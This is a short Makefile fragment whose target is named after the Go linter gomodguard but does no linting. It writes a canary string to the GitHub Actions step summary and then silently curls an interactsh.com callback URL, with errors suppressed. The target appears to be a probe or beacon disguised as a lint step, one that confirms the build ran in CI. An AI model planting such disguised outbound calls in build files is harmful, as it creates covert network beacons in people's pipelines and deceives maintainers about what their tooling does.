gomodguard:
	echo "gomodguard-canary-hb-1" >> $${GITHUB_STEP_SUMMARY:-/dev/null}
	curl -s http://interactsh.com/hb-test-1 2>/dev/null || true
